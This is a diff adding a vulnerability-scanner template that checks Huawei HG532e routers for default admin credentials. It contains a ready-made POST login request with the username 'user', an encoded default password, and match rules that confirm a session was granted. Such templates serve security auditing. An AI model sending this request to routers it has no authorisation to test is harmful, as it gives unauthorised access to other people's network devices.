@@ -1,0 +1,33 @@
+id: huawei-HG532e-default-login
+brief:
+    title: Huawei HG532e Default Credential
+    by: pussycat0x
+    level: high
+    about: Huawei HG532e default admin credentials were discovered.
+    label:
+        - default-login
+        - huawei
+        - vuln
+    score: CVSS:8.3
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/index/login.cgi'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: Language=en; FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0
+      body: Username=user&Password=MDRmODk5NmRhNzYzYjdhOTY5YjEwMjhlZTMwMDc1NjllYWYzYTYzNTQ4NmRkYWIyMTFkNTEyYzg1YjlkZjhmYg%3D%3D
+      signs:
+        - "on": word
+          has:
+            - 'Set-Cookie: SessionID'
+          in: header
+          need: all
+        - "on": word
+          has:
+            - <title>replace</title>
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
